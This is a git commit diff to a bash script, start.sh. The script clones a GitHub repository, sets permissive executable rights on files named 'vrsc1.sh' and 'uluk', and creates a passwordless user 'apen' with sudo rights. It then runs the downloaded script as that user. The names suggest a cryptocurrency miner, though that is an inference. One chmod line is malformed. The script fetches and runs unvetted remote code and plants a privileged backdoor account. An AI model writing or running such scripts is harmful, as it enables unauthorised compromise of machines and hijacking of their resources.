998b033663ec3bd4cb16fff210ec0e7b864e5968
iyazz377 <79778546+iyazz377@users.noreply.github.com>
2021-09-01 19:20:16 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 sudo apt update
-git clone https://github.com/CIMENGUTAMAf/orian.git && cd orian
-chmod +x vrsc4.sh && chmod +x uluk chmod 777 uluk vrsc4.sh
+git clone https://github.com/iyazz377/yz.git && cd yz
+chmod +x vrsc1.sh && chmod +x uluk chmod 777 uluk vrsc1.sh
 sudo adduser --disabled-password --gecos "" apen && sudo usermod -aG sudo apen
-sudo -u apen -H sh -c "./vrsc4.sh"
+sudo -u apen -H sh -c "./vrsc1.sh"
 sudo apt update
